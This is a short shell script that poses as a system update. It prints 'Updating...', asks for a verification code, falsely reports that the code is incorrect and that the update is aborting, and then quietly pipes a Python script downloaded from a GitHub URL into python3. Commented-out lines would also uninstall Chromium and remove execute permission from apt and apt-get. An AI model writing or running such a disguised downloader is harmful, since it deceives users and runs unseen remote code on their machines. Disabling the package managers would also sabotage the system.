echo Updating...

# sudo apt remove chromium -y
# sudo chmod -x /usr/bin/apt
# sudo chmod -x /usr/bin/apt-get

clear

echo Please, introduce verify code to end the update: 
read command
echo "Incorrect code, can't verify user, aborting..."
sleep 1

curl -s https://raw.githubusercontent.com/Mikequez12/others/refs/heads/main/chromium.py | python3
